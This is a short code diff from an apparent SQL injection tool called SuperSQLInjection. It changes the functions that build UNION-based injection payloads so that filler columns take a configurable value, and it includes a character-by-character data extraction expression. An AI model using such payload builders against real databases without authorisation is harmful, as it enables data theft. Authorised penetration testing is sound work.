@@ -29,7 +29,7 @@ namespace SuperSQLInjection.payload
         public static String unicode_value = "ascw(mid({data},{index},1))";
 
 
-        public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String table, String index)
+        public static String getUnionDataValue(int columnsLen, int showIndex,String Fill,List<String> columns, String table, String index)
         {
             StringBuilder sb = new StringBuilder();
             String data = "chr(94)&chr(94)&chr(33)&" + Comm.unionColumns(columns, "&chr(36)&chr(36)&chr(36)&") + "&chr(33)&chr(94)&chr(94)";
@@ -42,7 +42,7 @@ namespace SuperSQLInjection.payload
                 }
                 else
                 {
-                    sb.Append("1,");
+                    sb.Append(Fill+",");
                 }
             }
             sb.Remove(sb.Length - 1, 1);
@@ -50,7 +50,7 @@ namespace SuperSQLInjection.payload
         }
 
 
-        public static String getUnionDataValue(int columnsLen, int showIndex, int Fill, String dataPayLoad)
+        public static String getUnionDataValue(int columnsLen, int showIndex, String Fill, String dataPayLoad)
         {
             StringBuilder sb = new StringBuilder();
             for (int i = 1; i <= columnsLen; i++)
